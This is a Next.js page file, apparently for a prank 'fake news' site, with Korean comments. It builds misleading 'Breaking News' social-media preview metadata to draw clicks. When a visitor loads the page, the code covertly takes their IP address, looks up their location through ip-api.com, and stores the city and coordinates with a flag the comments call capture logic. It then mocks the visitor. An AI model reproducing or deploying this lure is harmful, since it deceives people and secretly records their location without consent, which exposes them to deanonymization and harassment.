import { supabase } from '@/lib/supabase';
import { Metadata } from 'next';
import { headers } from 'next/headers';

type Props = { params: Promise<{ id: string }>; };

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { id } = await params;
  const { data: post } = await supabase.from('news_posts').select('*').eq('id', id).single();
  if (!post) return { 
    title: "Noticiario Bromas MX",
    description: "🚨 Breaking News!",
  };
  return {
    title: post.title,

    // ✅ 추가된 부분 시작 (기존 유지 + 확장)
    description: "🚨 Breaking News! Something shocking just happened!",

    openGraph: { 
      title: `[NOTICIA] ${post.title}`, 
      description: "🚨 Breaking News! Something shocking just happened!",
      url: `https://latam-en-vivo.online/news/${id}`,
      siteName: "Noticiario Bromas MX",
      images: [
        {
          url: post.image_url,
          width: 800,
          height: 600,
        }
      ],
      type: 'article' 
    },

    twitter: {
      card: "summary_large_image",
      title: `[NOTICIA] ${post.title}`,
      description: "🚨 Breaking News! Something shocking just happened!",
      images: [post.image_url],
    }
    // ✅ 추가 끝
  };
}

export default async function NewsDetailPage({ params }: Props) {
  const { id } = await params;

  // 🔴 [검거 로직] 접속자 IP 따서 DB 업데이트
  const headerList = await headers();
  const ip = headerList.get('x-forwarded-for')?.split(',')[0] || 'Unknown';

  if (ip !== 'Unknown') {
    try {
      // 위치 정보 서비스 호출 (ip-api)
      const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
      const geo = await geoRes.json();
      
      if (geo.status === 'success') {
        await supabase.from('news_posts').update({
          ip: ip,
          country: geo.country,
          city: geo.city,
          lat: geo.lat.toString(),
          lon: geo.lon.toString(),
          is_caught: true
        }).eq('id', id);
      }
    } catch (e) {
      console.error("Tracing error:", e);
    }
  }

  // DB에서 뉴스 내용 가져오기
  const { data: post } = await supabase.from('news_posts').select('*').eq('id', id).single();
  
  if (!post) return <div className="p-10 text-center font-black">Noticia no encontrada.</div>;

  return (
    <main className="min-h-screen bg-white text-black font-sans">
      <div className="bg-red-600 text-white p-3 text-center font-black italic shadow-lg">
        NOTICIARIO BROMAS MX - ÚLTIMO MOMENTO
      </div>

      <div className="max-w-2xl mx-auto p-5 py-10">
        <div className="inline-block bg-black text-white text-[10px] font-bold px-2 py-1 mb-4 uppercase">
          EXCLUSIVA MUNDIAL
        </div>
        
        <h1 className="text-3xl md:text-4xl font-black leading-tight mb-8">
          {post.title}
        </h1>

        <img src={post.image_url} alt="Noticia" className="w-full h-auto mb-10 shadow-2xl border border-gray-200" />

        <div className="space-y-6 text-gray-800 leading-relaxed text-lg border-t pt-8">
          <p className="font-bold text-red-700 underline decoration-red-200 decoration-4 underline-offset-4">
            this news is fake:
          </p>
          <p>
            you are idiot! haha!!
          </p>
          <div className="py-10 text-center text-gray-400 italic text-sm animate-pulse">
            Cargando más información...
          </div>
        </div>
      </div>
    </main>
  );
}